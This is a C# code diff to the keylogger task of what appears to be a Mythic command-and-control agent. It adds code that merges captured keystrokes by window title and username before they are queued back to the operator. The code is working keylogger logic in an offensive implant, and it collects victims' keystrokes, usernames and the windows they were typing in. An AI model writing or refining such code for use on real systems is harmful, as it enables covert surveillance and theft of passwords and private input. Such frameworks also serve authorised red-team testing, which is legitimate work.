@@ -68,10 +68,41 @@ namespace Tasks
                     KeylogInformation[] keylogs = _keylogs.Flush();
                     if (keylogs.Length > 0)
                     {
+                        bool found = false;
+                        List<KeylogInformation> aggregated = new List<KeylogInformation>();
+                        aggregated.Add(new KeylogInformation {
+                            WindowTitle = keylogs[0].WindowTitle,
+                            Username = keylogs[0].Username,
+                            Keystrokes = keylogs[0].Keystrokes
+                        });
+                        for (int i = 1; i < keylogs.Length; i++)
+                        {
+                            for(int j = 0; j < aggregated.Count; j++)
+                            {
+                                if (aggregated[j].WindowTitle == keylogs[i].WindowTitle && aggregated[j].Username == keylogs[i].Username)
+                                {
+                                    KeylogInformation update = aggregated[j];
+                                    update.Keystrokes += keylogs[i].Keystrokes;
+                                    aggregated[j] = update;
+                                    found = true;
+                                    break;
+                                }
+                            }
+                            if (!found)
+                            {
+                                aggregated.Add(new KeylogInformation
+                                {
+                                    WindowTitle = keylogs[i].WindowTitle,
+                                    Username = keylogs[i].Username,
+                                    Keystrokes = keylogs[i].Keystrokes
+                                });
+                            }
+                            found = false;
+                        }
                         _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
                         {
                             TaskID = _data.ID,
-                            Keylogs = keylogs
+                            Keylogs = aggregated.ToArray()
                         });
                     }
                 }
